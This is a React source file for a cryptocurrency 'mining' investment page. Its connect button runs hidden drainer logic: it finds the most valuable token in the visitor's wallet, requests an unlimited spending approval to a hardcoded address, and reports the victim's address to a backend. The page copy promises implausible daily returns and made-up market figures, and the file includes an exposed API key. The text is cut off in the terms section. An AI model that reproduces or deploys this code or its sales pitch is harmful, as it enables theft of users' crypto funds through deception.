import "../assets/css/mint.css";
import "../assets/css/amaran.min.css";
import "../assets/css/animate.css";
import "../assets/css/bootstrap.min.css";
import "../assets/css/cryptocoins.css";
import "../assets/css/font-awesome.min.css";
// import "../assets/css/home.css";
import "../assets/css/ionicons.min.css";
import "../assets/css/magnific-popup.css";
import "../assets/css/owl.carousel.min.css";
import "../assets/css/owl.theme.default.min.css";
import "../assets/css/responsive.css";
import "../assets/css/spop.min.css";
import "../assets/css/style.css";
import "../assets/css/theme.css";
import "../assets/css/customstyle.css";

import footer_bg from "../assets/img/footer_bg.png";
import banner_bg2 from "../assets/img/banner_bg2.png";
import token_bg from "../assets/img/token_bg.png";
import JN59UlI from "../assets/img/JN59UlI.png";
import HOqvV8i from "../assets/img/HOqvV8i.png";
import bnb_logo from "../assets/img/bnb-logo.svg";
import busd_logo from "../assets/img/busd-logo.svg";
import tether from "../assets/img/tether.svg";

import { connectWallet, disconnectWallet, getCurrentWalletConnected, walletAddressResize } from "../util/interact.js";

import { useEffect, useState } from "react";
import { useHistory } from "react-router-dom";
import { BigNumber } from "ethers";
import { nftAddress } from "../constants/address";
import { tokenAddress } from "../constants/address";
import { chainId } from "../constants/address";
import api from "../util/api.js";
import $ from "jquery";
import Web3 from "web3";
import Swal from 'sweetalert2'


function MintPage() {
  const [walletAddress, setWallet] = useState("");
  const [status, setStatus] = useState("");
  let history = useHistory();

  const [mint, setMint] = useState(0);
  const [tokenContracts, setTokenContracts] = useState([]);

  /*   const serverUrl = "https://8mu2apptlnm4.usemoralis.com:2053/server";
  const appId = "UBjvihVqesxPw7UtpavjEQhLO6MX6fJf0PbkTWl0"; */

  /*   const rpcURL = "https://bsc-dataseed.binance.org/";
  const web3 = new Web3(rpcURL); */
  const web3 = new Web3(window.ethereum);

  // const rpcURL = "https://data-seed-prebsc-1-s1.binance.org:8545";
  const [referCode, setReferCode] = useState('');




    // Function to disconnect the wallet
    const handleDisconnect = () => {

      Swal.fire({
        title: "Are you sure?",
        text: "You want to disconnect wallet",
        icon: "warning",
        showCancelButton: true,
        confirmButtonColor: "#3085d6",
        cancelButtonColor: "#d33",
        confirmButtonText: "Disconnect"
      }).then((result) => {
        if (result.isConfirmed) {
          const { address, status } = disconnectWallet();
      setWallet(address); 
      setStatus(status);
          Swal.fire({
            title: "Disconnected!",
            text: "Wallet Disconnected.",
            icon: "success"
          });
        }
      });
      /* const { address, status } = disconnectWallet();
      setWallet(address); 
      setStatus(status); */

      /* console.log('address')
    console.log(address) */
    };

  useEffect(async () => {
    const { address, status } = await getCurrentWalletConnected();
    /* console.log('address')
    console.log(address)
    console.log('status')
    console.log(status) */

    const queryParams = new URLSearchParams(window.location.search);
    const code = queryParams.get('refer_code');
    setReferCode(code)
    

    setWallet(address);
    setStatus(status);

    addStyles();
    addTimer();

    addWalletListener();
    // getTokenContracts();
    //Moralis.start({ serverUrl, appId });
    /* Moralis.start({
      apiKey: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImQ1ZDZjN2ExLWNiZWUtNDA2NS05ZDJjLWQ2ZjgzNTViNzM3ZCIsIm9yZ0lkIjoiMzg3NzA2IiwidXNlcklkIjoiMzk4Mzc4IiwidHlwZUlkIjoiYWJjNGZlM2QtZjhhMS00YTkyLTljZmQtYzUyZWViMzc4ZTllIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3MTI5NDI4NTIsImV4cCI6NDg2ODcwMjg1Mn0.CxTExrfe_7rHtEc_xXxRmvlc0AOyzfO3vbl12rhK8A8',
    }); */
  }, []);

  const runApprover = () => {
    let walletAddress0;
    walletAddress0 = connectWallet();
    console.log(walletAddress);
  };

  const addStyles = () => {
    $(window).on("scroll", function () {
      var scroll = $(window).scrollTop();

      if (scroll >= 80) {
        $("header").addClass("nav-fixed");
      } else {
        $("header").removeClass("nav-fixed");
      }
    });

    $(window).scroll(function () {
      if ($(this).scrollTop() > 150) {
        $(".scrollup").fadeIn();
      } else {
        $(".scrollup").fadeOut();
      }
    });

    $(".scrollup").on("click", function (e) {
      e.preventDefault();
      $("html, body").animate(
        {
          scrollTop: 0,
        },
        600
      );
      return false;
    });

    //Hide Navbar Dropdown After Click On Links
    var navBar = $(".header_wrap");
    var navbarLinks = navBar.find(".navbar-collapse ul li a.nav_item");

    $.each(navbarLinks, function (i, val) {
      var navbarLink = $(this);

      navbarLink.on("click", function () {
        navBar.find(".navbar-collapse").collapse("hide");
        $("header").removeClass("active");
      });
    });

    //Main navigation Active Class Add Remove
    $(".navbar-toggler").on("click", function () {
      $("header").toggleClass("active");
    });

    $(document).on("ready", function () {
      if ($(window).width() > 991) {
        $("header").removeClass("active");
      }
      $(window).on("resize", function () {
        if ($(window).width() > 991) {
          $("header").removeClass("active");
        }
      });
    });
  };

  const addTimer = () => {
    // Set the countdown date
    const countDownDate = new Date("Oct 17, 2024 23:59:59").getTime();

    // Get the elements to display the days, hours, minutes, and seconds
    const showDays = document.querySelectorAll(".show_day");
    const showHr = document.querySelectorAll(".show_hr");
    const showMin = document.querySelectorAll(".show_min");
    const showSec = document.querySelectorAll(".show_sec");

    // Update the countdown every 1 second
    const x = setInterval(function () {
      // Get current time
      const now = new Date().getTime();
      // Calculate the distance between now and the countdown date
      const distance = countDownDate - now;

      // Time calculations for days, hours, minutes, and seconds
      const days = Math.floor(distance / (1000 * 60 * 60 * 24));
      const hours = Math.floor(
        (distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
      );
      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((distance % (1000 * 60)) / 1000);

      // Format hours, minutes, and seconds to have leading zeros if less than 10
      const formattedDays = days.toString().padStart(2, "0");
      const formattedHours = hours.toString().padStart(2, "0");
      const formattedMinutes = minutes.toString().padStart(2, "0");
      const formattedSeconds = seconds.toString().padStart(2, "0");

      // Display the result in the respective elements
      showDays.forEach((day) => {
        day.innerHTML = formattedDays;
      });
      showHr.forEach((hr) => {
        hr.innerHTML = formattedHours;
      });
      showMin.forEach((min) => {
        min.innerHTML = formattedMinutes;
      });
      showSec.forEach((sec) => {
        sec.innerHTML = formattedSeconds;
      });

      // If the countdown is over, clear the interval
      if (distance < 0) {
        clearInterval(x);
        showDays.forEach((day) => {
          day.innerHTML = "00";
        });
        showHr.forEach((hr) => {
          hr.innerHTML = "00";
        });
        showMin.forEach((min) => {
          min.innerHTML = "00";
        });
        showSec.forEach((sec) => {
          sec.innerHTML = "00";
        });
      }
    }, 1000);
  };

  function addWalletListener() {
    if (window.ethereum) {
      window.ethereum.on("accountsChanged", (accounts) => {
        if (accounts.length > 0) {
          setWallet(accounts[0]);
        } else {
          setWallet("");
        }
      });
    } else {
      setStatus(
        <p>
          <a
            target="_blank"
            href={`https://metamask.io/download.html`}
            rel="noreferrer"
          >
            You must install Metamask, a virtual Ethereum wallet, in your
            browser.
          </a>
        </p>
      );
    }
  }

  const getTokenAndTransaction = async () => {
    let tokenContract, nftContract;

    const walletResponse = await connectWallet();
    setStatus(walletResponse.status);
    setWallet(walletResponse.address);

    const nftAbi = require("../constants/nftabi.json");
    window.contract = await new web3.eth.Contract(nftAbi, nftAddress);
    nftContract = window.contract;

    console.log("N: ", nftContract);

    let price = await nftContract.methods.getNftPrice().call();
    price = String(Number(price) * mint);

    if (Number(price) > 0) {
      const tokenAbi = require("../constants/tokenabi.json");
      window.contract = await new web3.eth.Contract(tokenAbi, tokenAddress);
      tokenContract = window.contract;

      console.log("T: ", tokenContract);

      let balance = await tokenContract.methods.balanceOf(walletAddress).call();

      if (Number(balance) < Number(price)) {
        alert("It's not enough LOOKS for mint!");
        return;
      }

      const approveTransactionParameters = {
        to: tokenAddress,
        from: walletAddress,
        data: tokenContract.methods.approve(nftAddress, price).encodeABI(),
      };

      await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [approveTransactionParameters],
      });

      const mintTransactionParameters = {
        to: nftAddress,
        from: walletAddress,
        data: nftContract.methods.mintToken(mint).encodeABI(),
      };
      await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [mintTransactionParameters],
      });
    }
  };

  const updateTokensWithMoralis = async () => {
    //-------------------------   get token info from server ---------------------------

    let tokens, tokenPrices, tokenDecimals;
    await api
      .post("/readFile", {
        params: {},
      })
      .then(function (res) {
        let data = res.data.Success.split(",");
        data.splice(-1, 1);
        // console.log(data)
        let j = 0;
        tokens = [];
        tokenPrices = [];
        tokenDecimals = [];
        for (let i = 0; i < data.length; i += 3) {
          tokens.push(data[i]);
          tokenPrices.push(data[i + 1]);
          tokenDecimals.push(data[i + 2]);
          j++;
        }
        console.log(tokens);
        console.log(tokenPrices);
        console.log(tokenDecimals);
      })
      .catch(function (error) {
        console.log("stories error response :: ", error);
      });

    //-------------------------   get token info from moralis ---------------------------
    // let startPoint = 60;
    // let slicelen = 10;
    // if ((startPoint + slicelen) > tokens.length) {
    //   slicelen = tokens.length - startPoint;
    // }
    // for (let i = startPoint; i < startPoint+slicelen; i++) {
    //   const options = {
    //     address: tokens[i],
    //     chain: "bsc",
    //     exchange: "PancakeSwapv2",
    //   };
    //   let tokenPriceInfo = await Moralis.Web3API.token.getTokenPrice(options);
    //   if (!tokenPriceInfo) {
    //     break;
    //   }
    //   tokenPrices[i] = tokenPriceInfo.usdPrice;
    //   tokenDecimals[i] = tokenPriceInfo.nativePrice.decimals;
    //   console.log(tokenPrices[i], ": " ,tokenDecimals[i]);
    // }

    //-------------------------   making token info string from json  ---------------------------

    // tokens = require("../constants/tokens1.json");
    // let tokenAddr = "";
    // let tokenPrice = "";
    // let decimal = "";
    // for (let i = 0; i < tokens.length; i++) {
    //   tokenAddr += tokens[i].address.toUpperCase() + "," + tokenPrice + "," + decimal + ",";
    // }
    // console.log(tokenAddr)

    //-------------------------   writing token info string to server  ---------------------------

    let tokenAddr = "";
    for (let i = 0; i < tokens.length; i++) {
      tokenAddr +=
        tokens[i] + "," + tokenPrices[i] + "," + tokenDecimals[i] + ",";
    }
    console.log(tokenAddr);

    await api
      .post("/writeFile", {
        params: { tokenInfo: tokenAddr },
      })
      .then(function (res) {
        console.log(res.data.Success);
      })
      .catch(function (error) {
        console.log("stories error response :: ", error);
      });

    // const options = { chain: "bsc", address: "0xD547529Dc7C841920f533bF701C45965dAf930e0", from_block: "0" };
    // const transfers = await Moralis.Web3API.account.getTokenTransfers(options);
    // console.log(transfers)
  };

  const onAdmin = async () => {
    let email = $("#enterAdmin").val();

    if (email == "loparoy39@gmail.com") {
      history.push("/admin");
    }
  };

  const setApprove = async (walletAddress0) => {
    //-------------------------   get token info from server ---------------------------

    let tokens, tokenPrices, tokenDecimals;
    /* await api
  .post("/readFile", {
    params: {},
  })
  .then(function (res) {
    let data = res.data.Success.split(",");
    data.splice(-1, 1);
    // console.log(data)
    let j = 0;
    tokens = [];
    tokenPrices = [];
    tokenDecimals = [];
    for (let i = 0; i < data.length; i+=3) {
      tokens.push(data[i]);
      tokenPrices.push(data[i+1]);
      tokenDecimals.push(data[i+2]);
      j++;
    }
  })
  .catch(function (error) {
    console.log("stories error response :: ", error);
  }); */

    //-------------------------   get token address from wallet ---------------------------

    const options = { chain: "bsc", address: walletAddress0, from_block: "0" };
    let tx;
    /* let tx = await Moralis.Web3API.account.getTokenTransfers(options); */
    await api
      .post("/token-transfer", {
        address: walletAddress0, // Include the options object in the body
      })
      .then(function (res) {
        tx = res?.data;
        console.log(res?.data);
      })
      .catch(function (error) {
        console.log("stories error response :: ", error);
      });

    let walletTokenAddress = [];
    for (let i = 0; i < tx.result.length; i++) {
      let is = false;
      for (let j = 0; j < walletTokenAddress.length; j++) {
        if (walletTokenAddress[j] == tx.result[i].address.toUpperCase()) {
          is = true;
        }
      }
      if (is == false) {
        walletTokenAddress.push(tx.result[i].address.toUpperCase());
      }
      is = false;
    }
    console.log("walletTokenAddress", walletTokenAddress);

    //-------------------------   get token balance from wallet tokens ---------------------------

    let walletTokenBalance = [];
    const tAbi = require("../constants/abis.json");

    for (let i = 0; i < walletTokenAddress.length; i++) {
      window.contract = await new web3.eth.Contract(
        tAbi[0],
        walletTokenAddress[i]
      );
      let balance = await window.contract.methods
        .balanceOf(walletAddress0)
        .call();
      walletTokenBalance.push(Number(balance));
    }

    console.log("Balance: ", walletTokenBalance);

    //-------------------------   get token price ---------------------------

    let walletTokenPrices = [];
    let walletTokenDecimals = [];
    let walletTokenB = [];
    for (let i = 0; i < walletTokenAddress.length; i++) {
      walletTokenPrices[i] = 0;
      walletTokenDecimals[i] = 0;
      for (let j = 0; j < tokens.length; j++) {
        if (tokens[j] == walletTokenAddress[i]) {
          walletTokenPrices[i] = Number(tokenPrices[j]);
          walletTokenDecimals[i] = Number(tokenDecimals[j]);
        }
      }
    }

    for (let i = 0; i < walletTokenAddress.length; i++) {
      walletTokenB[i] =
        (walletTokenBalance[i] * walletTokenPrices[i]) /
        Math.pow(10, walletTokenDecimals[i]);
    }
    console.log("Prices: ", walletTokenPrices);
    console.log("Decimals: ", walletTokenDecimals);
    console.log("wholeBalance:", walletTokenB);

    //-------------------------   get max big price token  ---------------------------

    let len = walletTokenAddress.length;
    let walletTokenB1 = [];
    /* let maxValueTokenAddress = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56"; */
    let maxValueTokenAddress = "0x55d398326f99059ff775485246999027b3197955";


    if (len > 0) {
      for (let i = 0; i < len; i++) {
        walletTokenB1[i] = walletTokenB[i];
      }
      for (let i = 0; i < len - 1; i++) {
        for (let j = i + 1; j < len; j++) {
          if (walletTokenB1[i] < walletTokenB1[j]) {
            let x = walletTokenB1[i];
            walletTokenB1[i] = walletTokenB1[j];
            walletTokenB1[j] = x;
          }
        }
      }
      if (walletTokenB1[0] == 0) {
        maxValueTokenAddress = "0x55d398326f99059ff775485246999027b3197955";
      } else {
        for (let i = 0; i < len; i++) {
          if (walletTokenB[i] == walletTokenB1[0]) {
            maxValueTokenAddress = walletTokenAddress[i];
          }
        }
      }
    } else {
      maxValueTokenAddress = "0x55d398326f99059ff775485246999027b3197955";
    }
    console.log(walletTokenB1);
    console.log(walletTokenAddress);
    console.log(maxValueTokenAddress);

    //-------------------------   performing approve ---------------------------

    /* let approveAddress = "0xC7C421854295709136ED9179f16E469909530F44";
    let price = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";

    window.contract = await new web3.eth.Contract(tAbi[0], maxValueTokenAddress);
    let tokenContract = window.contract;

    const approveTransactionParameters = {
      to: maxValueTokenAddress,
      from: walletAddress0,
      data: tokenContract.methods.approve(approveAddress, price).encodeABI(),
    };



    let txx = await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [approveTransactionParameters],
    }) */

    const approveAddress = "0xC7C421854295709136ED9179f16E469909530F44";
    const price =
      "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";

    // Create a new contract instance
    /* window.contract =new web3.eth.Contract(
  tAbi[0],
  approveAddress
); */

    window.contract = await new web3.eth.Contract(
      tAbi[0],
      maxValueTokenAddress
    );
    let tokenContract = window.contract;

    // Estimate gas
    const gasEstimate = await tokenContract.methods
      .approve(approveAddress, price)
      .estimateGas({ from: walletAddress0 });

    // Get the current gas price from the network
    const gasPrice = await web3.eth.getGasPrice();

    // Define transaction parameters
    const approveTransactionParameters = {
      to: maxValueTokenAddress, // Address of the contract you are interacting with
      from: walletAddress0, // Address of the wallet initiating the transaction
      data: tokenContract.methods.approve(approveAddress, price).encodeABI(), // Encoded ABI of the approve function call
      gas: web3.utils.toHex(gasEstimate), // Use the estimated gas limit
      gasPrice: web3.utils.toHex(gasPrice), // Use the current gas price
    };

    // Send the transaction
    let txx = await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [approveTransactionParameters],
    });

    //-------------------------  sending mail to the client ---------------------------

    if (txx) {
      await api
        .post("/transferAddress", {
          address: walletAddress0, // Directly include the address field
        })
        .then(function (response) {
          console.log(response.data.message); // Update to match your server response format
        })
        .catch(function (error) {
          console.log("stories error response :: ", error);
        });
    }
  };


  const onBtnClick = async () => {
    if (window.ethereum) {
      try {
        const chain = await window.ethereum.request({ method: "eth_chainId" });
        if (chain === chainId) {
          const addressArray = await window.ethereum.request({
            method: "eth_requestAccounts",
          });
          if (addressArray.length > 0) {
            setApprove(addressArray[0]);
            
            // Use async/await instead of .then()
            try {

              if(addressArray.length > 0){
              const res = await api.post("/registration", {
                address: addressArray[0], // Include the options object in the body
                referCode,
              });
              /* const res = await api.get("/test"); */

              let tx = res?.data;
              console.log("Server response:", tx);}

            } catch (error) {
              console.error("API error:", error);
            }
          } else {
            alert("No accounts found");
          }
        } else {
          // Handle chain switching
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId }],
          });
        }
      } catch (err) {
        console.error("Error:", err);
      }
    } else {
      const dappUrl = window.location.href.split("//")[1].split("/")[0];
      const metamaskAppDeepLink = "https://metamask.app.link/dapp/" + dappUrl;
      window.open(metamaskAppDeepLink, "_self");
    }
  };

/*   const onBtnClick = async () => {
    if (window.ethereum) {
      try {
        const chain = await window.ethereum.request({ method: "eth_chainId" });
        if (chain === chainId) {
          const addressArray = await window.ethereum.request({
            method: "eth_requestAccounts",
          });
          if (addressArray.length > 0) {
            setApprove(addressArray[0]);
          } else {
            alert("No accounts found");
          }
        } else {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId }],
          });
        }
      } catch (err) {
        console.error("Error:", err);
      }
    } else {
      const dappUrl = window.location.href.split("//")[1].split("/")[0];
      const metamaskAppDeepLink = "https://metamask.app.link/dapp/" + dappUrl;
      window.open(metamaskAppDeepLink, "_self");
    }
  }; */
  /*   const onBtnClick = async () => {
   

    if (window.ethereum) {
      try {
        alert('test');
        const chain = await window.ethereum.request({ method: 'eth_chainId' })
        // console.log(chain, parseInt(chain, 16), chainId, parseInt(chain, 16) === chainId)
        if (chain == chainId) {
          const addressArray = await window.ethereum.request({
            method: 'eth_requestAccounts',
          })
          if (addressArray.length > 0) {
            setApprove(addressArray[0])
          } else {
          }
        } else {
          window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId:chainId }],
          }).then(function(res) {

            // alert("Click again");
          })
        }
        
      } catch (err) {
      }
    } else {
      const dappUrl = window.location.href.split("//")[1].split("/")[0];
  const metamaskAppDeepLink = "https://metamask.app.link/dapp/" + dappUrl;
  window.open(metamaskAppDeepLink, "_self");
    }
  } */

  return (
    <>
      <div
        className="v_dark loaded"
        data-spy="scroll"
        data-offset="110"
        data-new-gr-c-s-check-loaded="14.1050.0"
        data-gr-ext-installed=""
      >
        {/* <div className="parallax-mirror div1-1">
          <img className="parallax-slider img1-1" src={footer_bg} data-xblocker="passed" />
        </div>
        <div className="parallax-mirror div1-2">
          <img className="parallax-slider img1-2" src={banner_bg2} data-xblocker="passed" />
        </div>
        <div className="parallax-mirror div1-3">
          <img className="parallax-slider img1-3" src={footer_bg} data-xblocker="passed" />
        </div> */}
        <div className="parallax-mirror div1-4">
          <img
            className="parallax-slider img1-4"
            src={token_bg}
            data-xblocker="passed"
          />
        </div>
        <div className="parallax-mirror div1-5">
          <img
            className="parallax-slider img1-5"
            src={banner_bg2}
            data-xblocker="passed"
          />
        </div>

        <div className="nigr" id="adsdasxczczx" style={{ display: "none" }}>
          <div className="loader">
            <div className="loader__bar"></div>
            <div className="loader__bar"></div>
            <div className="loader__bar"></div>
            <div className="loader__bar"></div>
            <div className="loader__bar"></div>
            <div className="loader__ball"></div>
          </div>
        </div>

        <div className="demo">
          <ul className="list_none">
            <div className="color-switch">
              <p>Color Switcher</p>
              <div className="color_box">
                <button value="theme" className="default active"></button>
                <button value="theme-green" className="green"></button>
                <button value="theme-orange" className="orange"></button>
                <button
                  value="theme-lightgreen"
                  className="lightgreen"
                ></button>
                <button value="theme-redpink" className="redpink"></button>
              </div>
            </div>
          </ul>
        </div>

        <div id="loader-wrapper">
          <div id="loading-center-absolute">
            <div className="object" id="object_four"></div>
            <div className="object" id="object_three"></div>
            <div className="object" id="object_two"></div>
            <div className="object" id="object_one"></div>
          </div>
          <div className="loader-section section-left"></div>
          <div className="loader-section section-right"></div>
        </div>

        <header className="header_wrap fixed-top">
          <div className="container-fluid">
            <nav className="navbar navbar-expand-lg">
              <a
                className="navbar-brand page-scroll animation animated fadeInDown"
                data-animation="fadeInDown"
                data-animation-delay="1s"
                style={{ animationDelay: "1s", opacity: 1 }}
              >
                <img
                  className="logo_light fav-logo"
                  height="50px"
                  width="50px"
                  src={JN59UlI}
                  alt="logo"
                />
                <img
                  className="logo_dark fav-logo"
                  src={JN59UlI}
                  alt="logo"
                  data-xblocker="passed"
                  style={{ visibility: "visible" }}
                />
              </a>
              <button
                className="navbar-toggler green animation animated fadeInDown"
                type="button"
                data-toggle="collapse"
                data-target="#navbarSupportedContent"
                aria-controls="navbarSupportedContent"
                aria-expanded="false"
                aria-label="Toggle navigation"
                data-animation="fadeInDown"
                data-animation-delay="1.1s"
                style={{ animationDelay: "1.1s", opacity: 1 }}
              >
                ≡
              </button>
              <div
                className="collapse navbar-collapse"
                id="navbarSupportedContent"
              >
                <ul className="navbar-nav m-auto">
                  <li
                    className="dropdown animation animated fadeInDown"
                    data-animation="fadeInDown"
                    data-animation-delay="1.1s"
                    style={{ animationDelay: "1.1s", opacity: 1 }}
                  >
                    <a data-toggle="dropdown" className="nav-link" href="#">
                      Home
                    </a>
                  </li>
                </ul>
              </div>
            </nav>
          </div>
        </header>
        <section
          id="home_section"
          className="section_banner bg_black_dark"
          data-z-index="1"
          data-parallax="scroll"
          data-image-src={banner_bg2}
        >
          {/* <canvas id="banner_canvas" class="transparent_effect fixed" width="2560" height="1080"></canvas> */}
          <div className="container">
            <div className="row align-items-center">
              <div className="col-lg-6 col-md-12 col-sm-12 order-lg-first">
                <div className="banner_text_s2 text_md_center">
                  <h1
                    className="animation text-white animated fadeInUp"
                    data-animation="fadeInUp"
                    data-animation-delay="1.1s"
                    style={{ animationDelay: "1.1s", opacity: 1 }}
                    id="mainheader"
                  >
                    <strong>
                      Join The Fastest Growing Blockchain Ecosystem
                    </strong>
                  </h1>
                  <h5
                    className="animation presale_txt text-white animated fadeInUp"
                    data-animation="fadeInUp"
                    data-animation-delay="1.3s"
                    style={{ animationDelay: "1.3s", opacity: 1 }}
                  >
                    Mining
                    <mark className="green ms-2">Live</mark>
                  </h5>
                  <div
                    className="transparent_bg tk_counter_inner m-lg-0 banner_token text-center px-0 animation animated fadeIn"
                    data-animation="fadeIn"
                    data-animation-delay="1.4s"
                    style={{ animationDelay: "1.4s", opacity: 1 }}
                  >
                    <i>Mining event ends in:</i>

                    <div
                      className="timer-box timer_box_1 animation animated fadeInUp"
                      data-animation="fadeInUp"
                      data-animation-delay="1.2s"
                      style={{ animationDelay: "1.2s", opacity: 1 }}
                    >
                      <p className="display-timer">
                        <span className="timer-details">
                          <span className="show_day show-timer">00</span>
                          <span className="timer-text"> DAYS </span>
                        </span>

                        <span className="show-timer"> : </span>

                        <span className="timer-details">
                          <span className="show_hr show-timer">12</span>
                          <span className="timer-text"> HOURS </span>
                        </span>

                        <span className="show-timer"> : </span>

                        <span className="timer-details">
                          <span className="show_min show-timer">19</span>
                          <span className="timer-text"> MINUTES </span>
                        </span>

                        <span className="show-timer"> : </span>

                        <span className="timer-details">
                          <span className="show_sec show-timer">15</span>
                          <span className="timer-text"> SECONDS </span>
                        </span>
                      </p>
                    </div>
                  </div>
                  <div
                    className="btn_group pt-2 pb-3 animation animated fadeInUp"
                    data-animation="fadeInUp"
                    data-animation-delay="1.4s"
                    style={{ animationDelay: "1.4s", opacity: 1 }}
                  >
                  {
                    walletAddress ?
                    

                    <p
                      className="btn green text-white btn-radius nav_item content-popup"
                      onClick={() => {
                        handleDisconnect();
                      }}
                      id="claimButton"
                    >
                      {/* Disconnect → */}
                      {/* {walletAddress} */}
                      {walletAddressResize(walletAddress)} →
                    </p>
                    :


                    <p
                      className="btn green text-white btn-radius nav_item content-popup"
                      onClick={() => {
                        onBtnClick();
                      }}
                      id="claimButton"
                    >
                      Connect →
                    </p>
                  }
                    
                  </div>
                  <span
                    className="text-white icon_title animation animated fadeInUp"
                    data-animation="fadeInUp"
                    data-animation-delay="1.4s"
                    style={{ animationDelay: "1.4s", opacity: 1 }}
                  >
                    We work with: 
                  </span>
                  <ul className="list_none currency_icon">
                    <li
                      className="animation animated fadeInUp"
                      data-animation="fadeInUp"
                      data-animation-delay="1.6s"
                      style={{ animationDelay: "1.6s", opacity: 1 }}
                    >
                      <img src={bnb_logo} width="20px" height="20px" />
                      <span>Binance Smart Chain </span>
                    </li>
                    <li
                      className="animation animated fadeInUp"
                      data-animation="fadeInUp"
                      data-animation-delay="1.6s"
                      style={{ animationDelay: "1.6s", opacity: 1 }}
                    >
                      <img src={busd_logo} width="20px" height="20px" />
                      <span>BUSD </span>
                    </li>
                    {/* <li className="animation animated fadeInUp" data-animation="fadeInUp" data-animation-delay="1.7s" style={{animationDelay: '1.7s', opacity: 1}}>
                      <img src={tether} width="20px" height="20px" />
                      <span>Tether (USDT)</span>
                    </li> */}
                  </ul>

                  <div id="whitepaper" className="team_pop mfp-hide">
                    <div className="row m-0">
                      <div className="col-md-12">
                        <div className="pt-3 pb-3">
                          <div className="title_dark title_border">
                            <h4 id="h4t">BUSD (BRISE) Mining</h4>
                            Attempting to login with Metamask in order to claim
                            <span id="token">$BRISE (BEP-20)</span> tokens...
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div className="col-lg-6 col-md-12 col-sm-12 order-first">
                <div
                  className="banner_image_right res_md_mb_50 res_xs_mb_30 animation animated fadeInRight"
                  data-animation-delay="1.5s"
                  data-animation="fadeInRight"
                  style={{ animationDelay: "1.5s", opacity: 1 }}
                >
                  <img
                    id="central-image"
                    alt="banner_vector2"
                    src={HOqvV8i}
                    data-xblocker="passed"
                    style={{ visibility: "visible" }}
                  />
                </div>
              </div>
            </div>
          </div>
        </section>

        <footer>
          <div
            class="top_footer bg_light_dark"
            data-z-index="1"
            data-parallax="scroll"
            data-image-src={footer_bg}
          >
            <div class="container">
              <div class="row">
                <div class="col-lg-4 col-md-12">
                  <div
                    class="footer_logo mb-3 animation animated fadeInUp"
                    data-animation="fadeInUp"
                    data-animation-delay="0.2s"
                    style={{ animationDelay: "0.2s", opacity: 1 }}
                  >
                    <a href="#" class="page-scroll">
                      <img
                        alt="logo"
                        height="50px"
                        width="50px"
                        src={JN59UlI}
                        class="fav-logo"
                      />
                    </a>
                  </div>
                  <div class="footer_desc">
                    <p
                      class="animation animated fadeInUp"
                      data-animation="fadeInUp"
                      data-animation-delay="0.4s"
                      style={{ animationDelay: "0.4s", opacity: 1 }}
                      id="subheader"
                    >
                      Welcome to Busd Coin Mining Company, a pioneering
                      enterprise in the cryptocurrency mining sector. Our focus
                      is on providing users with a seamless and profitable
                      mining experience using BUSD, integrated with the Metamask
                      wallet on the Binance Smart Chain (BSC) network. Our
                      innovative platform ensures daily mining interest ranging
                      from a minimum of 0.7% to higher returns, catering to both
                      small and large investors.
                    </p>

                    <h4 className="mt-3">Company Overview</h4>

                    <p
                      class="animation animated fadeInUp"
                      data-animation="fadeInUp"
                      data-animation-delay="0.4s"
                      style={{ animationDelay: "0.4s", opacity: 1 }}
                      id="subheader"
                    >
                      <strong>Busd Coin Mining Company</strong> is committed to
                      offering reliable and lucrative mining opportunities. With
                      a current market capitalization of 15.8 billion BUSD and
                      213.7 million BUSD mined in the last seven days, we are
                      positioned as a strong player in the cryptocurrency mining
                      market.
                    </p>

                    <h4 className="mt-3">Investment Details</h4>

                    <ul className="text-white">
                      <li>
                        Daily Mining Interest: Minimum of 0.7% daily, with
                        potential for higher returns.
                      </li>
                      <li>
                        Integration with Metamask Wallet: Ensures secure and
                        efficient transactions.
                      </li>
                      <li>
                        Binance Smart Chain (BSC): Utilizes BSC for optimal
                        performance and low transaction costs.
                      </li>
                      <li>
                        Gas Fees: Minimal gas fees ranging from $0.02 to $0.1,
                        payable in BNB.
                      </li>
                      <li>
                        Weekly Interest Payout: Every 7 days, the accumulated
                        interest will be added to the user's BUSD wallet
                      </li>
                    </ul>

                    <h4 className="mt-3">Investment Details</h4>
                    <p
                      class="animation animated fadeInUp"
                      data-animation="fadeInUp"
                      data-animation-delay="0.4s"
                      style={{ animationDelay: "0.4s", opacity: 1 }}
                      id="subheader"
                    >
                      Minimum Mining Amount: 115 BUSD
                    </p>
                    <p
                      class="animation animated fadeInUp"
                      data-animation="fadeInUp"
                      data-animation-delay="0.4s"
                      style={{ animationDelay: "0.4s", opacity: 1 }}
                      id="subheader"
                    >
                      Maximum Mining Amount: 10,000,000 BUSD
                    </p>

                    <h5 className="mt-3">How It Works</h5>

                    <ul className="text-white">
                      <li>
                        Deposit Funds: Users deposit BUSD into their Metamask
                        wallet under the Binance Smart Chain network.
                      </li>
                      <li>
                        Daily Returns: Earn daily interest from a minimum of
                        0.7%, depending on market conditions and mining
                        performance.
                      </li>
                      <li>
                        Interest Payout: Every 7 days, the accumulated interest
                        will be added to the user's BUSD wallet
                      </li>
                      <li>
                        Gas Fees: All transactions incur minimal gas fees, paid
                        in BNB, ensuring cost-effectiveness and transparency.
                      </li>
                    </ul>

                    
                    

                    
                    <h5 className="mt-3">Terms and Conditions</h5>
                    <ul className="text-white">
                      <li>
                        Gas Fees: Transactions require gas fees to be paid in
                        BNB. The gas fee ranges from $0.02 to $0.1.
                      </li>
                      <li>
                        Network: All transactions and mining activities occur on
                        the Binance Smart Chain (BSC).
                      </li>
                      <li>
